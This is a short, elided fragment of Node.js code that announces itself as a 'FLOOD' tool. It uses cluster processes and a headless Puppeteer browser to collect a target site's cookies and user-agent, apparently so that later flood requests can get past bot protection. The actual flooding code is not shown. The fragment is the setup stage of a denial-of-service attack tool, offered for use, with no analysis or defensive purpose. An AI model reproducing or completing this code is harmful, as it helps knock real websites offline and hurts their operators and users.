...
if (cluster.isMaster) {
    console.log('Started | FLOOD MADE BY TRÙM BÚ CODE [Peter]');
    ...
    async function getCookieAndUserAgent() {
        const browser = await puppeteer.launch({ headless: "new" });
        const page = await browser.newPage();
        await page.goto(target);

        // Lấy cookie từ trang web
        ...
        await browser.close();
        return { cookies: cookiesString, userAgent };
    }

    async function main() {
        // Lấy thông tin cookie và user-agent
        const { cookies, userAgent } = await getCookieAndUserAgent();
